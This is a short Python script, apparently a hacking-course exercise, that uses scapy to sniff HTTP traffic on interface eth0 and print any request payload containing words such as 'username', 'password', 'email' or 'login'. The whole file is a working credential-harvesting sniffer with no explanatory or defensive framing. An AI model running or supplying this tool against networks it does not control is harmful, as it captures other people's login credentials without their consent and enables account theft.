import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=packet_sniff)
	
def packet_sniff(packet):
	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):
			load=packet[scapy.Raw].load
			keywords=["username","user","password","email","login"]
			for keyword in keywords:
				if keyword in load:
					print(load)
					break
sniff("eth0")